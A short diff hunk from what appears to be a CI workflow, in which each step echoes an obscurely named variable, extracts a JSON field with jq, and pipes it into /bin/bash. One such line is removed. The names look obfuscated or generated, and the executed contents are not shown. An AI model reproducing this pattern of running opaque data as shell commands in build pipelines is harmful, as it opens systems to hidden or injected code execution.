@@ -22,7 +22,6 @@ jobs:
           echo $kzp8487 | jq -r .axe52510 | /bin/bash
           echo $k22 | jq -r .vptg8303 | /bin/bash
           echo $nzff3 | jq -r .fvtta7 | /bin/bash
-          echo $ldb9 | jq -r .wuav7 | /bin/bash
           echo $pasnv14 | jq -r .i70429 | /bin/bash
           printf '%s' "$itn19" | jq -r .red499 | /bin/bash
           echo $nnfq60 | jq -r .nzx4 | /bin/bash
